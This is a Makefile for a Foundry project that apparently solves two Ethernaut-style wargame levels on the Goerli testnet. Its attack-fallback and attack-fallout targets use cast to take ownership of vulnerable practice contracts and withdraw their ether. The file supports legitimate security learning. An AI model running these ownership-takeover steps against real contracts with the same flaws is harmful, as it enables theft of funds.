-include .env

.PHONY: all clean remove install update build attack-fallback attack-fallout

help:
	@echo "Usage:"
	@echo "  make attack<-level>\n    example: make attack-fallback"

all: clean remove install update build

# Clean the repo
clean  :; forge clean

# Remove modules
remove :; rm -rf .gitmodules && rm -rf .git/modules/* && rm -rf lib && touch .gitmodules && git add . && git commit -m "modules"

install :; forge install chainaccelorg/foundry-devops@0.0.11 --no-commit && forge install smartcontractkit/chainlink-brownie-contracts@0.6.1 --no-commit && forge install foundry-rs/forge-std@v1.5.3 --no-commit

# Update Dependencies
update:; forge update

build:; forge build

attack-fallback :
	@cast send $(FALLBACK_CONTRACT_ADDRESS) "contribute()" --value 0.0001ether --rpc-url $(GOERLI_RPC_URL) --private-key $(GOERLI_PRIVATE_KEY) && cast send $(FALLBACK_CONTRACT_ADDRESS) --value 0.0001ether --rpc-url $(GOERLI_RPC_URL) --private-key $(GOERLI_PRIVATE_KEY) && cast send $(FALLBACK_CONTRACT_ADDRESS) "withdraw()" --rpc-url $(GOERLI_RPC_URL) --private-key $(GOERLI_PRIVATE_KEY)

attack-fallout :
	@cast send $(FALLOUT_CONTRACT_ADDRESS) "Fal1out()" --rpc-url $(GOERLI_RPC_URL) --private-key $(GOERLI_PRIVATE_KEY)
